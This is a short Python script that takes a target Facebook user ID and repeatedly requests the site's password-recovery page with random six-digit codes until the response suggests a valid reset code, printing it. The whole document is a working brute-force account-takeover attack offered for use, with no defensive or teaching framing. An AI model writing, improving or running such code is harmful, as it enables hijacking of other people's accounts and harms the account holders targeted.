import random 
import requests,os
user ="1234567890"
id=input("ID Target ::  ")
while True:
 cod = str("".join(random.choice(user)for i in range(6)))
 url=f"https://www.facebook.com/recover/password/?u={id}&n={cod}&f1=default_recover&sih=0&msgr=0"
 i=requests.get(url).text

 if '<input type="text" class=' in i:
 	print (f"True Cod  =>  :  {cod}")
 	break
 else :
 	os.system("clear")
 	print (f"ERORR Cod  :  {cod}")